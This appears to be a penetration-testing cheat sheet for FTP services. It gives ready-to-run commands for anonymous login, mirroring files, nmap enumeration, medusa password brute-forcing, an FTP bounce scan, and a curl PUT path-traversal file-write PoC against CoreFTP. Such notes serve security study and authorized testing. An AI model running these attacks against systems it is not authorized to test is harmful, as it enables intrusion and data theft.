- Download all files from FTP
```shell
wget -m --no-passive ftp://anonymoous:anonymous@$IP
```

- Interact with FTP: we can use telnet or netcat
```shell
nc -nv $IP 21
	OR
telnet $IP 21
```

- If the FTP server runs with TLS/SSL encryption, we can use openssl
```shell
openssl s_client -connect $IP:21 -starttls ftp
```

-----
# ENUMERATION
-----
- Perform the scan:
```
sudo nmap -sV -sC -A -p21 $IP
```

- To use nmap ftp script, we first need to update the db:
```shell
sudo nmap --script-udpatedb
```

-----
# EXPLOIT
-----
## Misconfigurations
#### Anonymous Authentication
```bash
ftp $IP

Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

## Protocol Specifics Attacks
#### Brute Forcing
- Brute Forcing with Medusa
```bash
medusa -u $USER -P rockyou.txt -h 10.129.203.7 -M ftp

-u: user
-U: list of users
-P: list of passwords
-p: password 
-h: target
-M: protocol to attack
```

#### FTP Bounce Attack
- Use FTP server as a pivot point to deliver traffics to the targets
```bash
nmap -Pn -v -n -p80 -b $USER:$PASSWORD@$IP $TARGET_IP
-b: option is used to perform bounce attack
```

----- 
# LATEST FTP VULNERABILITIES
----
## CoreFTP Exploitation
- Does not correctly process the HTTP PUT request => an authenticated directory/path traversal, and arbitrary file write vulnerability.
- Allows attackers to write files outside the directory to which the service has access.
```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```